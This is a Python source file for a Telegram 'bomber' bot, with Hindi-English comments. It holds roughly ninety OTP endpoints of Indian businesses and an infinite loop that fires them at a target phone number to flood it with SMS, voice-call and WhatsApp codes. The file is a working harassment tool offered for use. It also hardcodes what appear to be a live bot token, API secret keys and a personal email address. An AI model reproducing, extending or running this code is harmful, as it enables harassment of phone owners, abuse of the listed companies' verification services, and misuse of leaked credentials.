
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🤖 TELEGRAM MIXED BOMBER BOT
SMS + Call + WhatsApp — sab random mix mein, infinite loop
"""

import telebot
import requests
import threading
import time
import logging
import sys
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask

# ============================================================
# ⚙️ CONFIG
# ============================================================
BOT_TOKEN = "8747605629:AAG_2obZeLoDkDWhw15E7WImnX7vvTaC3fQ"      # @BotFather se le
ADMIN_IDS = [6841090981]                 # @userinfobot se apni ID
MAX_THREADS = 80                        # Parallel threads
REQUEST_DELAY = 0.05
REQUEST_TIMEOUT = 10
PROGRESS_EVERY = 30                     # Har 30 cycles pe update

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[logging.FileHandler("bomber.log"), logging.StreamHandler()]
)
log = logging.getLogger("bomber")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
active_bombs = {}

# ============================================================
# 🌐 FLASK WEB SERVER FOR RENDER HEALTH CHECK
# ============================================================
app = Flask(__name__)

@app.route('/health')
def health_check():
    return "OK", 200

def run_flask():
    app.run(host="0.0.0.0", port=10000)

# ============================================================
# 📡 API DATABASE
# ============================================================

SMS_APIS = [
    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Lenskart v2", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"},
     "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"},
     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST",
     "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
     "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST",
     "headers": {"Content-Type": "application/json", "identifier": "home"},
     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST",
     "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"channel":"sms","flow":"SIGNUP","phoneNumber":"{p}","templateName":"default"}}'},
    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","send_otp":true}}'},
    {"name": "Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","phoneCode":"+91"}}'},
    {"name": "Byju's", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phoneNumber={p}"},
    {"name": "Spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4,"expected_action":"login"}}'},
    {"name": "Citymall", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    {"name": "Jobhai", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Kwikfix", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Hourlyrooms", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "BharatLoan", "url": "https://www.bharatloan.com/login-sbm", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
    {"name": "Pagarbook", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","language":1}}'},
    {"name": "Redcliffe", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    {"name": "55Club", "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"91{p}","codeType":1}}'},
    {"name": "Woodenstreet", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"telephone":"{p}"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     "method": "POST", "headers": {"Content-Type": "application/json",
     "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
     "data": lambda p: f'{{"phone":"{p}","email":"sdhabai09@gmail.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"query":"mutation {{ SendOtp(input: {{ mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\" }}) {{ status {{ message code }} }} }}"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded",
     "X-Requested-With": "XMLHttpRequest"},
     "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
     "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobile={p}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "Tata Capital Biz", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencers", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shoppers Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f'method=firstRegisterApi&data={{"customerMobile":"{p}","generateOtp":"true"}}'},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.in/api/v1/auth/send-otp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'}
]

CALL_APIS = [
    {"name": "Lenskart Call", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}","channel":"voice"}}'},
]

WA_APIS = [
    {"name": "Wakefit WA", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST",
     "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
     "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
]

MIXED_POOL = SMS_APIS + CALL_APIS + WA_APIS

def send_request(api, phone):
    try:
        url = api["url"]
        method = api["method"]
        headers = api["headers"]
        data = api["data"](phone)
        if method == "POST":
            if "application/json" in headers.get("Content-Type", ""):
                import json
                response = requests.post(url, headers=headers, data=json.dumps(json.loads(data)), timeout=REQUEST_TIMEOUT)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=REQUEST_TIMEOUT)
        elif method == "GET":
            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        return response.status_code
    except Exception as e:
        return None

def bomber_worker(phone, mode, chat_id, message_id):
    count = 0
    pool = MIXED_POOL if mode == "MIXED" else (SMS_APIS if mode == "SMS" else (CALL_APIS if mode == "CALL" else WA_APIS))
    while active_bombs.get(chat_id, False):
        api = random.choice(pool)
        status = send_request(api, phone)
        if status:
            count += 1
        time.sleep(REQUEST_DELAY)
        if count % PROGRESS_EVERY == 0:
            try:
                bot.edit_message_text(
                    f"🚀 <b>Bombing In Progress...</b>\nTarget: <code>{phone}</code>\nMode: <b>{mode}</b>\nSuccessful Hits: <code>{count}</code>",
                    chat_id=chat_id, message_id=message_id, parse_mode="HTML"
                )
            except Exception:
                pass

@bot.message_handler(commands=['start'])
def cmd_start(message):
    help_text = (
        "🔥 <b>Welcome ERROR 404KNG 💀</b>\n\n"
        "💥 <b>MIXED Bomber Bot -- ∞ Infinite Mode</b>\n"
        "SMS + Call + WhatsApp -- sab mixed!\n\n"
        "⚡ <b>Commands:</b>\n"
        "• /bomb &lt;number&gt; -- 🚀 MIXED (SMS+Call+WA)\n"
        "• /sms &lt;number&gt; -- SMS only\n"
        "• /call &lt;number&gt; -- Voice call only\n"
        "• /wa &lt;number&gt; -- WhatsApp only\n"
        "• /stop -- Rok do bomb\n"
        "• /status -- Live status\n"
        "• /apis -- API count\n"
        "• /stats -- Bot stats (admin)\n\n"
        "💣 <b>Bomb infinite loop mein chalega -- APIs har cycle repeat hongi!</b>\n"
        "Sirf /stop se rukega"
    )
    bot.reply_to(message, help_text, parse_mode="HTML")

@bot.message_handler(commands=['bomb', 'sms', 'call', 'wa'])
def cmd_bomb(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Use format: /bomb <10-digit-number>")
        return
    phone = args[1]
    if not phone.isdigit() or len(phone) != 10:
        bot.reply_to(message, "❌ Invalid phone number! Please enter 10 digits.")
        return
    
    cmd = args[0][1:].upper()
    mode = "MIXED" if cmd == "BOMB" else cmd
    chat_id = message.chat.id

    if active_bombs.get(chat_id, False):
        bot.reply_to(message, "⚠️ Already a bombing process is running! Stop it first using /stop")
        return

    active_bombs[chat_id] = True
    msg = bot.reply_to(message, f"🚀 <b>Starting {mode} Bomber on {phone}...</b>", parse_mode="HTML")

    executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
    threading.Thread(target=bomber_worker, args=(phone, mode, chat_id, msg.message_id), daemon=True).start()

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    chat_id = message.chat.id
    if active_bombs.get(chat_id, False):
        active_bombs[chat_id] = False
        bot.reply_to(message, "🛑 <b>Bombing stopped successfully!</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Koi active bomb nahi hai.")

@bot.message_handler(commands=['apis'])
def cmd_apis(message):
    bot.reply_to(message, f"📊 Total Loaded APIs:\n- SMS: {len(SMS_APIS)}\n- Call: {len(CALL_APIS)}\n- WA: {len(WA_APIS)}")

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    log.info("Flask health check server started on port 10000.")

    log.info("Telegram Bot starting...")
    bot.infinity_polling()

